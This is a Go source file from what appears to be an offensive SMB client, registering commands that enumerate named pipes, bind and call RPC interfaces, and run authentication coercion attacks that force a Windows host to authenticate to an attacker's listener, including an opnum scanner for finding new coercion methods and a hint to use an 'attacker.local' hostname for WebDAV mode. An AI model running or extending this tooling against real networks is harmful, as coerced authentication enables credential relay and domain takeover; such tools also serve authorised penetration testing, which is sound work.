package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/coerce"
	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
)

func registerPipeCommands() {
	commands.Register(&Command{
		Name:        "pipes",
		Description: "List/enumerate named pipes",
		Usage:       "pipes [--all]",
		Handler:     cmdPipes,
	})

	commands.Register(&Command{
		Name:        "rpc",
		Description: "RPC interface operations",
		Usage:       "rpc <bind|call|scan|interfaces>",
		Handler:     cmdRpc,
	})

	commands.Register(&Command{
		Name:        "pipe",
		Description: "Raw named pipe I/O",
		Usage:       "pipe <open|read|write|transact|close>",
		Handler:     cmdPipe,
	})
}

func registerCoerceCommands() {
	commands.Register(&Command{
		Name:        "coerce",
		Description: "Execute authentication coercion",
		Usage:       "coerce <method> <listener> [--opnum N] [--http]",
		Handler:     cmdCoerce,
	})

	commands.Register(&Command{
		Name:        "discover",
		Aliases:     []string{"scan"},
		Description: "Discover coercion methods via opnum scanning",
		Usage:       "discover <listener> [--interface UUID]",
		Handler:     cmdDiscover,
	})

	// Coercion VFS commands (work only in coerce mode)
	commands.Register(&Command{
		Name:        "radar",
		Description: "Show coercion radar summary",
		Handler:     cmdCoerceRadar,
	})

	commands.Register(&Command{
		Name:        "listener",
		Description: "Set/show default listener for coercion tests",
		Usage:       "listener [IP]",
		Handler:     cmdCoerceListener,
	})

	commands.Register(&Command{
		Name:        "try",
		Description: "Test a method for coercion (in coerce mode)",
		Usage:       "try <opnum> [listener]",
		Handler:     cmdCoerceTry,
	})
}

func cmdPipes(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	info_("Enumerating named pipes on IPC$...")
	fmt.Println()

	// Connect to IPC$
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}
	defer client.TreeDisconnect(ctx, ipcTree)

	// Check common pipes with detailed status
	statuses := pipe.EnumerateCommonWithStatus(ctx, ipcTree)

	fmt.Printf("  %s%-20s %s%s\n", colorBold, "PIPE", "STATUS", colorReset)
	fmt.Println("  " + strings.Repeat("-", 35))

	available := 0
	accessDenied := 0
	for _, s := range statuses {
		var statusStr string
		switch s.Status {
		case "available":
			statusStr = colorGreen + "Available" + colorReset
			available++
		case "access_denied":
			statusStr = colorYellow + "Access Denied" + colorReset
			accessDenied++
		case "not_found":
			statusStr = colorRed + "Not Found" + colorReset
		default:
			// Show actual error for debugging
			if s.Error != nil {
				statusStr = colorRed + "Error: " + s.Error.Error() + colorReset
			} else {
				statusStr = colorRed + "Error" + colorReset
			}
		}

		fmt.Printf("  %-20s %s\n", s.Name, statusStr)
	}

	fmt.Println()
	if available > 0 {
		fmt.Printf("  %s%d%s pipe(s) accessible\n", colorGreen, available, colorReset)
	}
	if accessDenied > 0 {
		fmt.Printf("  %s%d%s pipe(s) access denied (may exist but need higher privileges)\n", colorYellow, accessDenied, colorReset)
	}
	fmt.Println()

	return nil
}

func cmdRpc(ctx context.Context, args []string) error {
	if len(args) < 1 {
		fmt.Println("\nRPC subcommands:")
		fmt.Println("  interfaces    List known RPC interfaces")
		fmt.Println("  bind          Bind to an interface")
		fmt.Println("  call          Call an opnum on bound interface")
		fmt.Println("  scan          Scan opnums for coercion candidates")
		fmt.Println("  status        Show current RPC binding status")
		fmt.Println("  close         Close current RPC connection")
		fmt.Println()
		return nil
	}

	switch args[0] {
	case "interfaces", "list":
		fmt.Println()
		fmt.Printf("  %s%-10s %-40s %s%s\n", colorBold, "NAME", "UUID", "PIPE", colorReset)
		fmt.Println("  " + strings.Repeat("-", 60))

		for _, iface := range dcerpc.WellKnownInterfaces {
			fmt.Printf("  %-10s %-40s %s\n", iface.Name, iface.UUID.String(), iface.Pipe)
		}
		fmt.Println()

	case "bind":
		return cmdRpcBind(ctx, args[1:])

	case "call":
		return cmdRpcCall(ctx, args[1:])

	case "scan":
		return cmdRpcScan(ctx, args[1:])

	case "status":
		return cmdRpcStatus(ctx, args[1:])

	case "close":
		return cmdRpcClose(ctx, args[1:])

	default:
		return fmt.Errorf("unknown subcommand: %s (use 'rpc' for help)", args[0])
	}

	return nil
}

func cmdCoerce(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) < 2 {
		fmt.Println("\nUsage: coerce <method> <listener> [options]")
		fmt.Println("\nMethods:")
		for _, c := range coerce.AllCoercers() {
			fmt.Printf("  %-15s %s\n", c.Name(), c.Description())
		}
		fmt.Println("\nOptions:")
		fmt.Println("  --http         Use HTTP/WebDAV instead of UNC")
		fmt.Println("  --opnum N      Test specific opnum only")
		fmt.Println("  --all          Fire all opnums (don't stop on success)")
		fmt.Println()
		return nil
	}

	method := args[0]
	listener := args[1]

	// Parse options
	opts := coerce.DefaultCoerceOptions()
	opts.Verbose = verbose

	// Pass credentials for PKT_PRIVACY authenticated RPC
	opts.Username = currentUser
	opts.Password = currentPassword
	opts.Domain = currentDomain

	for i := 2; i < len(args); i++ {
		switch args[i] {
		case "--http":
			opts.UseHTTP = true
		case "--all":
			opts.FireAll = true
		case "--opnum":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &opts.SpecificOpnum)
				i++
			}
		}
	}

	// Connect to IPC$
	info_("Connecting to IPC$...")
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}
	defer client.TreeDisconnect(ctx, ipcTree)

	// Create runner
	runner := coerce.NewRunner(session, ipcTree)

	// Generate token for correlation (will be embedded in callback path)
	token := coerce.GenerateToken()
	methodPrefix := method[:5] // "petit" or "spool" etc
	if len(method) < 5 {
		methodPrefix = method
	}
	correlationToken := fmt.Sprintf("%s_%s", strings.ToLower(methodPrefix), token)
	opts.Token = correlationToken // Pass to coercer so it uses the same token

	info_("Executing %s coercion to %s...", method, listener)
	info_("Correlation token: %s (look for this in your listener)", correlationToken)

	if opts.UseHTTP {
		info_("Using HTTP/WebDAV mode")
		// Check if listener looks like an IP - WebClient requires hostname
		if isIPAddress(listener) {
			warn_("WARNING: WebClient service only triggers for HOSTNAMES, not IP addresses!")
			warn_("Use a hostname like 'attacker.local' or configure DNS for your listener")
		}
	}

	results, err := runner.Run(ctx, method, listener, opts)

	// Display results
	fmt.Println()
	for _, r := range results {
		if r.Success {
			success_("[%s] %s", r.Method, r.Message)
		} else {
			warn_("[%s] %s", r.Method, r.Message)
		}
	}
	fmt.Println()

	if err != nil {
		return fmt.Errorf("coercion failed: %v", err)
	}

	success_("Check your listener for callback!")
	return nil
}

func cmdDiscover(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: discover <listener>")
		fmt.Println("\nScans common RPC interfaces for coercion-capable opnums.")
		fmt.Println("Watch your listener for ERROR_BAD_NETPATH callbacks.")
		fmt.Println()
		return nil
	}

	listener := args[0]

	// Connect to IPC$
	info_("Connecting to IPC$...")
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}
	defer client.TreeDisconnect(ctx, ipcTree)

	// Create discovery
	discovery := coerce.NewDiscovery(session, ipcTree)

	info_("Running quick scan for coercion candidates...")
	info_("Listener: %s", listener)
	info_("Watch for callbacks!")
	fmt.Println()

	results, err := discovery.QuickScan(ctx, listener)
	if err != nil {
		warn_("Scan errors: %v", err)
	}

	// Display findings
	coercionCandidates := 0
	for _, r := range results {
		if r.Status == "bad_netpath" {
			success_("[%s] opnum %d triggers callback!", r.InterfaceName, r.Opnum)
			coercionCandidates++
		} else if verbose {
			debug_("[%s] opnum %d: %s", r.InterfaceName, r.Opnum, r.Status)
		}
	}

	fmt.Println()
	if coercionCandidates > 0 {
		success_("Found %d potential coercion method(s)!", coercionCandidates)
	} else {
		info_("No new coercion methods discovered in quick scan")
		info_("Try manual opnum ranges with 'discover --interface <uuid> --range 0-100'")
	}

	return nil
}
